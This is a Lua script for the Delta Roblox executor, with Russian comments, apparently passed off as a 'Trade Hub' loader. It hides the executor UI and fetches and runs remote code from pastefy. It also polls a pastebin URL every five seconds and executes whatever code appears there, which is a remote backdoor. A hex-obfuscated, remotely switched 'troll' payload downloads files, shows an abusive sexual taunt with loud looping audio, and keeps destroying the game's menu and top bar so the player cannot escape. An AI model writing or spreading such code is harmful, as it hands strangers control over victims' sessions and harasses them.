
-- ============================================================
-- КОМБО: убиратель Delta → через 5 сек cool html
-- ============================================================

-- ============================================================
-- ЧАСТЬ 1: УБИРАТЕЛЬ DELTA (сразу, моментально)
-- ============================================================
local hui = (gethui and gethui()) or game:GetService("CoreGui")
local UIS = game:GetService("UserInputService")

local protected = { Chat = true, RobloxGui = true, BuyRobux = true, TopBar = true }
local hiddenGuis = {}
local hiding = false

local function hideAll()
    hiding = true
    hiddenGuis = {}
    local count = 0

    for _, gui in ipairs(hui:GetChildren()) do
        if gui:IsA("ScreenGui") and not protected[gui.Name] then
            local hadVisible = false

            for _, obj in ipairs(gui:GetDescendants()) do
                if (obj:IsA("ImageButton") or obj:IsA("TextButton") or
                    obj:IsA("Frame") or obj:IsA("TextLabel")) and obj.Visible then

                    if obj:IsA("TextButton") or obj:IsA("ImageButton") then
                        pcall(function()
                            obj.Active = false
                            obj.Selectable = false
                            obj.AutoButtonColor = false
                        end)
                    end

                    obj.Visible = false
                    hadVisible = true
                    count = count + 1
                end
            end

            if hadVisible and gui.Enabled then
                gui.Enabled = false
                table.insert(hiddenGuis, gui)
            end
        end
    end

    hiding = false
    print("[Delta Hide] Спрятано моментально:", count)
end

local function showAll()
    hiding = true
    for _, gui in ipairs(hiddenGuis) do
        if gui and gui.Parent then
            gui.Enabled = true
            for _, obj in ipairs(gui:GetDescendants()) do
                if obj:IsA("ImageButton") or obj:IsA("TextButton") or
                   obj:IsA("Frame") or obj:IsA("TextLabel") then
                    obj.Visible = true
                end
            end
        end
    end
    hiddenGuis = {}
    hiding = false
    print("[Delta Hide] Возвращено")
end

-- Хоткей RightShift для возврата
UIS.InputBegan:Connect(function(input, processed)
    if hiding then return end
    if processed then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        if #hiddenGuis > 0 then showAll() else hideAll() end
    end
end)

-- ЗАПУСК УБИРАТЕЛЯ СРАЗУ
hideAll()
print("[Delta Hide] Убиратель сработал моментально")

-- ============================================================
-- ЧАСТЬ 2: ЧЕРЕЗ 5 СЕК ЗАГРУЖАЕМ cool json
-- ============================================================
task.wait(5)

print("[Loader] Загружаю json Trade Hub...")

local url = "https://pastefy.app/AKqMztXR/raw"

local ok, err = pcall(function()
    local src = game:HttpGet(url)
    local fn = loadstring(src)
    if fn then
        fn()
        print("[Loader] ✅ попа загружен")
    else
        warn("[Loader] ❌ loadstring вернул nil")
    end
end)

if not ok then
    warn("[Loader] ❌ Ошибка загрузки: " .. tostring(err))
end

-- ============================================
-- Pastebin Auto-Executor для Delta Executor
-- ============================================
local PASTEBIN_URL = "https://pastebin.com/raw/kKRdR0k5"
local INTERVAL     = 5       -- опрос каждые 5 секунд
-- ============================================

-- Универсальный HTTP-запрос с таймаутом (фикс зависаний Delta)
local function safeHttpGet(url)
    local body = nil
    local done = false

    -- Запускаем запрос в отдельном потоке
    task.spawn(function()
        local ok, res = pcall(function()
            -- Перебираем все известные Delta методы запроса
            if syn and syn.request then
                return syn.request({Url = url, Method = "GET"}).Body
            elseif http and http.request then
                return http.request({Url = url, Method = "GET"}).Body
            elseif request then
                return request({Url = url, Method = "GET"}).Body
            elseif http_request then
                return http_request({Url = url, Method = "GET"}).Body
            elseif Delta and Delta.request then
                return Delta.request({Url = url, Method = "GET"}).Body
            elseif game and game.HttpGet then
                return game:HttpGet(url)
            end
        end)
        if ok then body = res end
        done = true
    end)

    -- Ждём ответа максимум 4 секунды (чтобы не «съесть» весь интервал)
    local start = tick()
    while not done and (tick() - start) < 4 do
        task.wait(0.1)
    end

    return body
end

local lastCode = ""

local function pollAndRun()
    local raw = safeHttpGet(PASTEBIN_URL)

    -- Пропускаем, если ответа нет, пусто или это HTML-страница
    if not raw or raw == "" or raw:sub(1, 1) == "<" then
        return
    end

    -- Не запускаем, если код не изменился
    if raw == lastCode then
        return
    end

    lastCode = raw

    -- Выполняем полученный код
    local chunk, compileErr = loadstring(raw)
    if not chunk then
        warn("[AutoExec] Ошибка компиляции: " .. tostring(compileErr))
        return
    end

    local success, runErr = pcall(chunk)
    if not success then
        warn("[AutoExec] Ошибка выполнения: " .. tostring(runErr))
    else
        print("[AutoExec] Код обновлён и выполнен.")
    end
end

-- Бесконечный цикл (работает в фоне и не блокирует основной скрипт)
task.spawn(function()
    task.wait(1) -- небольшая пауза перед первым запуском
    while true do
        pollAndRun()
        task.wait(INTERVAL)
    end
end)

-- ============================================
--  Troll Screen + кликабельная картинка
--  + ПОЯВЛЕНИЕ КАРТИНКИ ПО КЛИКУ
--  + АКТИВАЦИЯ ТОЛЬКО ПРИ "on" В PASTEBIN
--  + ПОПАП БЕЗ ОБВОДКИ, МЕНЬШЕ, РОВНО ПО ПАЛЬЦУ
--  + ВСЕ URL ЗАШИФРОВАНЫ (HEX / XOR+HEX)
-- ============================================

-- ===== ДЕКОДЕРЫ =====
local function h(s)  -- hex → строка
    return (s:gsub("%x%x", function(c) return string.char(tonumber(c, 16)) end))
end

local XOR_KEY = 0x5A
local function dec(s)  -- XOR-0x5A + hex → строка
    return (s:gsub("%x%x", function(c)
        return string.char(bit32.bxor(tonumber(c, 16), XOR_KEY))
    end))
end

-- ===== ЗАШИФРОВАННЫЕ СТРОКИ =====
-- pastebin.com/raw/SWQZAFMn
local E_PASTEBIN = "68747470733a2f2f706173746562696e2e636f6d2f7261772f5357515a41464d6e"

-- raw.githubusercontent.com/.../photo_2025-12-03_21-03-11.jpg
local E_IMG = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6970616479732f636f72652f726566732f68656164732f6d61696e2f70686f746f5f323032352d31322d30335f32312d30332d31312e6a7067"

-- raw.githubusercontent.com/.../audio_2025-12-04_15-22-47.mp3
local E_AUDIO = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6970616479732f636f72652f726566732f68656164732f6d61696e2f617564696f5f323032352d31322d30345f31352d32322d34372e6d7033"

-- 👇👇👇 СЮДА ВСТАВЬ СВОЮ ЗАШИФРОВАННУЮ СТРОКУ 👇👇👇
local E_POPUP = ""

-- ===== ДЕКОДИРОВАННЫЕ URL =====
local PASTEBIN_URL = h(E_PASTEBIN)
local IMG_URL      = h(E_IMG)
local AUDIO_URL    = h(E_AUDIO)
local POPUP_URL    = E_POPUP ~= "" and dec(E_POPUP) or IMG_URL -- запасной вариант, если пусто
local TEXT         = "U LIKE BDSM U BAD SCAMMER DIEE🍆"

local CHECK_INTERVAL = 5

local function getPastebinStatus()
    local success, response = pcall(function()
        return game:HttpGet(PASTEBIN_URL)
    end)
    if not success or not response then return nil end
    local lower = string.lower(response)
    if string.find(lower, "on") and not string.find(lower, "off") then
        return "on"
    elseif string.find(lower, "off") then
        return "off"
    end
    return nil
end

local function startTrollScript()
    if _G.BDSM_Troll_Active then return end
    _G.BDSM_Troll_Active = true

    local imgPath   = "bdsm_img.jpg"
    local audioPath = "bdsm_audio.mp3"
    local popPath   = "bdsm_popup.jpg"

    if not isfile(imgPath)   then writefile(imgPath,   game:HttpGet(IMG_URL))   end
    if not isfile(audioPath) then writefile(audioPath, game:HttpGet(AUDIO_URL)) end
    if not isfile(popPath)   then writefile(popPath,   game:HttpGet(POPUP_URL)) end

    local imgAsset   = getcustomasset(imgPath)
    local audioAsset = getcustomasset(audioPath)
    local popAsset   = getcustomasset(popPath)

    local player = game:GetService("Players").LocalPlayer
    local pg = player:WaitForChild("PlayerGui")

    if pg:FindFirstChild("BDSM_Troll") then pg.BDSM_Troll:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "BDSM_Troll"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 2147483647
    gui.Parent = pg

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 620, 0, 520)
    frame.Position = UDim2.new(0.5, -310, 0.5, -260)
    frame.BackgroundTransparency = 1
    frame.Parent = gui

    local image = Instance.new("ImageLabel")
    image.Size = UDim2.new(1, 0, 1, 0)
    image.BackgroundTransparency = 1
    image.Image = imgAsset
    image.ScaleType = Enum.ScaleType.Stretch
    image.Parent = frame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 340, 1, 0)
    label.Position = UDim2.new(0.5, -170, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = TEXT
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextScaled = false
    label.TextSize = 34
    label.Font = Enum.Font.GothamSemibold
    label.TextWrapped = true
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.ZIndex = 5
    label.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 0, 0)
    stroke.Thickness = 4
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
    stroke.LineJoinMode = Enum.LineJoinMode.Round
    stroke.Parent = label

    local shadow = label:Clone()
    shadow.TextColor3 = Color3.fromRGB(0, 0, 0)
    shadow.Position = UDim2.new(0.5, -168, 0, 2)
    shadow.ZIndex = 4
    shadow.Parent = frame
    local sSt = shadow:FindFirstChildOfClass("UIStroke")
    if sSt then sSt:Destroy() end

    local clickBtn = Instance.new("TextButton")
    clickBtn.Size = UDim2.new(1, 0, 1, 0)
    clickBtn.BackgroundTransparency = 1
    clickBtn.Text = ""
    clickBtn.ZIndex = 10
    clickBtn.Parent = frame

    -- POPUP без обводки, меньше, ровно по пальцу
    local popup = Instance.new("ImageLabel")
    local popupSize = 100

    popup.Size = UDim2.new(0, popupSize, 0, popupSize)
    popup.AnchorPoint = Vector2.new(0.5, 0.5)
    popup.BackgroundTransparency = 1
    popup.BorderSizePixel = 0
    popup.Image = popAsset
    popup.ScaleType = Enum.ScaleType.Fit
    popup.Visible = false
    popup.ZIndex = 50
    popup.Parent = gui

    local popupBtn = Instance.new("TextButton")
    popupBtn.Size = UDim2.new(1, 0, 1, 0)
    popupBtn.BackgroundTransparency = 1
    popupBtn.Text = ""
    popupBtn.ZIndex = 51
    popupBtn.Parent = popup
    popupBtn.MouseButton1Click:Connect(function()
        popup.Visible = false
    end)

    clickBtn.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            popup.Position = UDim2.new(0, input.Position.X, 0, input.Position.Y)
            popup.Visible = true
            popup.Size = UDim2.new(0, 0, 0, 0)
            local ts = game:GetService("TweenService")
            local ti = TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
            ts:Create(popup, ti, {Size = UDim2.new(0, popupSize, 0, popupSize)}):Play()
        end
    end)

    local sound = Instance.new("Sound")
    sound.SoundId = audioAsset
    sound.Volume = 10
    sound.Looped = true
    sound.Playing = true
    sound.Parent = gui
    sound:Play()

    local CoreGui    = game:GetService("CoreGui")
    local StarterGui = game:GetService("StarterGui")
    local GuiService = game:GetService("GuiService")
    local UIS        = game:GetService("UserInputService")

    local function destroyTopBar()
        pcall(function()
            local t = CoreGui:FindFirstChild("TopBarApp")
            if t then t:Destroy() end
            local rg = CoreGui:FindFirstChild("RobloxGui")
            if rg then
                local tb = rg:FindFirstChild("TopBar")
                if tb then tb:Destroy() end
            end
        end)
    end

    local function killTopbarCore()
        pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
        pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
    end

    local function forceCloseMenu()
        pcall(function()
            if GuiService.MenuIsOpen then GuiService:SetMenuIsOpen(false) end
        end)
    end

    task.spawn(function()
        while true do
            destroyTopBar()
            killTopbarCore()
            forceCloseMenu()
            task.wait(0.1)
        end
    end)

    UIS.InputBegan:Connect(function(input, processed)
        if input.KeyCode == Enum.KeyCode.Escape then
            pcall(function()
                if GuiService.MenuIsOpen then GuiService:SetMenuIsOpen(false) end
            end)
        end
    end)

    print("[BDSM_Troll] Активирован (Pastebin: on).")
end

task.spawn(function()
    local lastStatus = nil
    while true do
        local status = getPastebinStatus()
        if status == "on" and lastStatus ~= "on" then
            startTrollScript()
        elseif status == "off" and lastStatus ~= "off" then
            _G.BDSM_Troll_Active = false
            print("[BDSM_Troll] off — скрипт не активен.")
        end
        lastStatus = status
        task.wait(CHECK_INTERVAL)
    end
end)
